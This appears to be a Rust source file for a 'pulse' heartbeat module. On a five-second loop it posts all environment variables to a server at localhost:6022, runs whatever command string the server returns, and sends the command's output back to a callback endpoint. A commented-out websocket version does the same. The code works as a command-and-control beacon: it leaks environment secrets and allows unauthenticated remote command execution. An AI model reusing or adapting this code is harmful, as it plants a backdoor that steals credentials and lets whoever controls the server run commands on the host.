use minreq::post;
// use rust_socketio::{Payload, Socket, SocketBuilder};
use serde_json::json;
use std::{
    collections::HashMap,
    env,
    fmt::format,
    process::{Command, Output},
};
use tokio::time;

const PULSE_INTERVAL: u64 = 5;
const PULSE_URL: &str = "http://localhost:6022/pulse";
const CALLBACK_URL: &str = "http://localhost:6022/pulse/callback";
// const SOCKET_URL: &str = "ws://localhost:6022";

pub fn start_pulse() {
    println!("+ starting pulse");
    tokio::spawn(async { send_pulse_async(PULSE_INTERVAL).await });
}

async fn send_pulse_async(interval_seconds: u64) -> std::io::Result<()> {
    let mut interval = time::interval(time::Duration::from_secs(interval_seconds));

    loop {
        let payload_env: HashMap<String, String> = env::vars().collect();
        let payload = json!(payload_env).to_string();
        let send_request = post(PULSE_URL)
            .with_header("Content-Type", "application/json")
            .with_body(payload)
            .send();

        if send_request.is_err() {
            println!("pulse sent failed - will retry");
        } else {
            let response = send_request.unwrap();

            print!("pulse sent - status:{} ", response.status_code);

            match response.status_code {
                204 => {
                    println!("ok")
                }
                201 => {
                    let data = response.as_str().unwrap();
                    let cid = response.headers["cid"].as_str();
                    println!("with eval: ({}) {}", cid, data);
                    let callback_output = evaluate_pulse_command_async(cid, data).await;
                    callback_pulse_async(callback_output).await;
                }
                _ => {
                    println!("with error: {}", response.reason_phrase);
                }
            }
        }

        interval.tick().await;
    }
}

async fn callback_pulse_async(payload_callback: HashMap<String, String>) -> () {
    let payload = json!(payload_callback).to_string();

    let url = CALLBACK_URL.to_string() + &"/DOPC".to_string();

    let send_request = post(url)
        .with_header("Content-Type", "application/json")
        .with_body(payload)
        .send();

    if send_request.is_err() {
        println!("pulse callback failed");
    } else {
        println!("pulse callback done");
    }
}

async fn evaluate_pulse_command_async(cid: &str, eval: &str) -> HashMap<String, String> {
    let mut args: Vec<&str> = eval.split(" ").collect();
    let mut command = Command::new(args[0]);
    args.remove(0);

    for arg in args {
        command.arg(arg);
    }

    let output = command.output();
    let mut payload: HashMap<String, String> = HashMap::new();

    payload.insert("cid".to_string(), cid.to_string());
    payload.insert("command".to_string(), eval.to_string());

    if output.is_err() {
        println!("-  failed to eval: {}", eval);
        payload.insert("error".to_string(), "failed to eval".to_string());
    } else {
        unsafe {
            let output_result = output.unwrap();
            payload.insert(
                "stderr".to_string(),
                String::from_utf8_unchecked(output_result.stderr),
            );
            payload.insert(
                "stdout".to_string(),
                String::from_utf8_unchecked(output_result.stdout),
            );
            payload.insert("status".to_string(), output_result.status.to_string());
        }
    }

    return payload;
}

// pub fn start_socket() {
//     println!("+ starting socket");
//     tokio::spawn(async { setup_socket_async().await });
// }

// async fn setup_socket_async() -> () {
//     let callback_command = |payload: Payload, _socket: Socket| match payload {
//         Payload::String(str) => println!("Received: {}", str),
//         Payload::Binary(bin_data) => println!("Received bytes: {:#?}", bin_data),
//     };

//     let callback_disconnect = |_payload: Payload, _socket: Socket| {
//         println!("- socket disconnected");
//     };

//     let socket = SocketBuilder::new(SOCKET_URL)
//         // .set_namespace("/")
//         // .expect("illegal namespace")
//         .on("command", callback_command)
//         .on("error", |err, _| eprintln!("Error: {:#?}", err))
//         .on("disconnect", callback_disconnect)
//         .connect();

//     println!("- socket connected");

//     if socket.is_err() {
//         println!("- socket error");
//     } else {
//         socket
//             .unwrap()
//             .emit("setActive", "DOPC")
//             .expect("setActive failed");
//     }
// }
